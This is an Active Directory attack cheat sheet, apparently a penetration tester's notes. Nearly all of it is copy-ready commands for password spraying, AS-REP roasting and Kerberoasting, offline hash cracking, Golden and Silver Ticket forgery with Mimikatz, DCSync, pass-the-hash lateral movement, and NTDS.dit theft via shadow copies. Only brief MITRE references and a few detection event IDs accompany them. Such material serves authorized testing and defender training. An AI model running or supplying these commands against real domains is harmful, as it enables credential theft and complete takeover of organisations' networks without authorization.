
> [!abstract] Active Directory Exploitation Cheat Sheet
> A comprehensive guide for attacking Active Directory environments. This note covers initial access (Brute Force/Spraying), credential theft (AS-REP Roasting, Kerberoasting, DCSync), ticket forgery (Golden/Silver Tickets), lateral movement (Pass-the-Hash), and domain persistence (Shadow Copy/NTDS extraction).
> 
> **Useful Resources:**
> - [OCD Mindmaps](https://orange-cyberdefense.github.io/ocd-mindmaps)
> - [S1ckB0y AD Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
> - [PowerSploit Documentation](https://powersploit.readthedocs.io/en/latest/Recon)

## Initial Access & Brute Force

> [!danger]+ Password Spraying & Brute Force
> Attempting to guess passwords for multiple accounts while avoiding account lockouts.
> 
> **Linux (CrackMapExec / NetExec):**
> ```bash
> # Spray a single password against a user list in a specific domain
> crackmapexec smb 172.20.10.9 -u user.txt -p "12345678" -d adolf.local --continue-on-success
> ```
> 
> **Windows (DomainPasswordSpray):**
> ```powershell
> powershell -ep bypass; import-module DomainPasswordSpray.ps1
> Invoke-DomainPasswordSpray -UserList users.txt -Domain adolf.local -PasswordList passlist.txt -OutFile sprayed-creds.txt
> ```
> 
> **Kerbrute (Linux/Windows):**
> *Uses TGT authentication for password spraying. Very fast and stealthy.*
> ```cmd
> .\kerbrute.exe passwordspray .\username.txt "12345678" -d sindad.local
> ```

> [!tip]+ Remote Desktop Protocol (RDP)
> ```bash
> # Connect to target via RDP from Linux
> xfreerdp /u:username /d:domain.com /v:iptarget
> ```

---

## AS-REP Roasting

> [!info] Concept & Detection
> **Attack Concept:** If Kerberos Pre-Authentication is disabled for a user, an attacker can send an AS-REQ to the KDC and receive an AS-REP containing a message encrypted with the user's password hash, which can be cracked offline.
> - **MITRE ATT&CK:** [T1558.004 - AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
> 
> **Kerberos Flow:**
> 1. **AS-REQ (PreAuth):** PC time encrypted with password hash + Identity (User, service, domain).
> 2. **AS-REP:** KDC sends TGT.
> 3. **TGS-Req:** PC sends TGS req to KDC.
> 4. **TGS-Rep:** KDC sends TGS to PC.
> 5. **Data-Req:** PC uses TGS to access service (SMB, FTP, etc.).
> 
> **Detection (Event Logs):**
> - **Event 4738:** User account changed (Ticket Encryption Type 0x17, Service Name krbtgt).
> - **Event 5136:** Directory service object modified (Pre-auth setting changed).

> [!example]+ Execution & Cracking
> 
> **1. Pre-Authentication Check (PowerView):**
> ```powershell
> Get-NetUser -PreauthNotRequired | select samaccountname, useraccountcontrol
> Get-DomainUser | where-Object { $_.UserAccountControl -Like "*DONT_REQ_PREAUTH*" }
> ```
> 
> **2. Extract Hashes:**
> *Linux (Impacket):*
> ```bash
> impacket-GetNPUsers dc-ip 172.20.10.77 -outputfile hash.txt -request domain.local/username
> ```
> *Windows (Rubeus):*
> ```cmd
> Rubeus.exe asreproast
> Rubeus.exe asreproast /format:hashcat /user:cna /outfile:C:\filehash.txt
> ```
> 
> **3. Crack Hashes (Hashcat):**
> ```bash
> hashcat --help | grep kerberos
> hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
> ```

---

## Kerberoasting

> [!info] Concept
> **Attack Concept:** Attackers abuse a valid TGT to request a TGS ticket for a service running on behalf of a user account. The TGS ticket contains a portion encrypted with the service account's password hash, which can be cracked offline. Target is services (SPNs).
> - **MITRE ATT&CK:** [T1558.003 - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
> - **Prerequisite:** Must be joined to the domain.

> [!example]+ Execution & Cracking
> 
> **Step 1: Find SPNs**
> ```powershell
> Get-NetUser | where-object {$_.servicePrincipalName} | fl
> setspn -T research -Q */*
> ```
> 
> **Step 2 & 3: Request TGS & Export**
> *Manual PowerShell:*
> ```powershell
> Add-Type -AssemblyName System.IdentityModel  
> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "spn"
> klist  # View tickets
> # Mimikatz: kerberos::list /export
> ```
> *Automated (Rubeus):*
> ```cmd
> Rubeus.exe kerberoast /outfile:hash.txt
> Rubeus.exe kerberoast /simple /outfile:passwordhashes.txt
> ```
> *Linux (Impacket):*
> ```bash
> impacket-GetUserSPNs -request -dc-ip 172.20.10.44 domain.local/username
> ```
> 
> **Step 4: Crack Hashes**
> ```bash
> # Hashcat (Mode 13100 for TGS)
> hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> 
> # Python script (Alternative)
> python3 tgsrepcrack.py .\wordlist.txt .\krbs.kirbi 
> ```

---

## Ticket Forgery (Silver & Golden)

> [!danger]+ Silver Ticket
> **Requirements:** Domain SID, NTLM hash of the target service account.
> **Concept:** Forges a TGS ticket directly, bypassing the KDC. Very stealthy.
> 
> ```cmd
> :: 1. Get Domain SID and Service Hash
> whoami /user
> mimikatz # sekurlsa::logonpasswords  :: copy service NTLM hash
> 
> :: 2. Forge Silver Ticket
> mimikatz # kerberos::golden /sid:domainsid /domain:adolf.local /target:hostservicehave.adolf.local /service:http /rc4:ntlmofservicehostname /ptt /user:realyuserindomain
> ```

> [!warning]+ Golden Ticket
> **Requirements:** KRBTGT hash, Domain SID.
> **Concept:** Forges a TGT, granting persistent domain admin access even if the user's password is changed.
> 
> ```powershell
> # 1. Get NTLM hash of admin user and Domain SID
> . .\Invoke-Mimikatz.ps1
> Invoke-Mimikatz -command '"privilege::debug" "sekurlsa::logonpasswords"' 
> get-DomainSID 
> 
> # 2. Pass the Hash (to access DC if needed)
> Invoke-Mimikatz -command '"sekurlsa::pth /user:administrator /ntlm:hash /domain:adolf.local /run:powershell.exe"'
> 
> # 3. Extract krbtgt hash on target admin/DC
> Invoke-mimikatz -command '"lsadump::lsa /patch"' -ComputerName pcadmin.adolf.local
> 
> # 4. Forge Golden Ticket locally
> Invoke-mimikatz -command '"kerberos::golden /user:administrator /domain:adolf.local /sid:domainSID /krbtgt:hash /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
> 
> # 5. Verify Access
> klist
> dir \\pcadmin.adolf.local\c$  
> ```

---

## DCSync Attack

> [!bug]+ DCSync
> **Concept:** Abuses the Directory Replication Service Remote Protocol (MS-DRSR) to mimic a Domain Controller and request password hashes for any user (e.g., krbtgt or Administrator).
> - **MITRE ATT&CK:** [T1003.006 - OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
> 
> **Windows (Mimikatz):**
> ```cmd
> mimikatz # lsadump::dcsync /user:adolf\cna
> ```
> 
> **Linux (Impacket):**
> ```bash
> impacket-secretsdump -just-dc-user anyuserindomain adolf.local/administrator:"password"@targetIP
> ```
> 
> **Crack NTLM Hashes:**
> ```bash
> hashcat -m 1000 file.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
> ```

---

## Lateral Movement (Pass-the-Hash / Overpass-the-Hash)

> [!tip]+ Enumeration & Token Manipulation
> ```powershell
> . .\powerview.ps1
> Get-Domain
> whoami /all
> Find-LocalAdminAccess
> 
> # Token Manipulation (Steal Admin Token)
> . .\Invoke-TokenManiPulation.ps1
> Invoke-TokenManiPulation -Enumerate
> 
> # Dump Credentials from memory
> . .\Invoke-Mimikatz.ps1
> Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' 
> ```

> [!example]+ Overpass-the-Hash (Pass-the-Hash to Kerberos)
> *Turns an NTLM hash into a Kerberos TGT.*
> **Windows (Mimikatz):**
> ```powershell
> Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::pth /user:administrator /domain:adolf.local /ntlm:hash /run:powershell.exe"'
> ```
> **Linux (Impacket):**
> ```bash
> impacket-wmiexec -hashes :ntlm username@192.168.10.34
> ```
> 
> **Connection Methods after PTH:**
> ```powershell
> Enter-PSSession cna.adolf.local
> ```
> ```cmd
> wmic /node:172.20.23.2 /user:cna /password:12345678 process call create "calc"
> winrs /r:hostname /u:username /p:password "cmd.exe /c hostname & whoami"
> PsExec64.exe -i \\172.20.10.4 -u domain\username -p 12345678 cmd
> ```

---

## Domain Persistence: NTDS.dit Extraction

> [!info] Shadow Copy (Stealing NTDS.dit)
> **Concept:** The `ntds.dit` file on a Domain Controller contains all domain password hashes. It is locked by the system, so attackers use Volume Shadow Copies to extract it. Requires Domain Admin access.
> 
> **Legacy Method (vshadow.exe):**
> ```cmd
> vshadow.exe -nw -p C:
> cp <shadow_copy_device_name>\windows\ntds\ntds.dit C:\ntds.dit.bak
> reg save HKLM\SYSTEM c:\System.bak
> ```
> 
> **Native Method (vssadmin):**
> ```cmd
> vssadmin create shadow /for=C:
> vssadmin list shadows
> :: Copy ntds.dit and SYSTEM hive from the shadow copy path
> ```
> 
> **Offline Extraction (Linux):**
> ```bash
> # Dump hashes locally from the extracted files
> impacket-secretsdump -ntds ntds.dit.bak -system System.bak LOCAL
> ```


